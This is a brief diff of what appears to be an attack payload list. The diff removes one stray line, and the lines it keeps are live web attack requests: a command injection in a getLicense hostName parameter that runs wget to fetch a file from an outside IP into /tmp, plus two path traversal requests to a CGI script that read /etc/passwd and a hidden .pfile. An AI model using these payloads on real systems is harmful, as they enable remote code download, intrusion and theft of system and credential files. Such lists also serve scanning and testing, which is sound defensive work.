@@ -1,4 +1,3 @@
-420
 /appliancews/getLicense?hostName=$(/usr/bin/wget%20http://1.1.1.1:12345/file%20-O%20/tmp/dsifnfnfdwsFFS)
 /cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../etc/passwd%00&Action=blast&hidenav=1
 /cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../home/dna/spool/.pfile
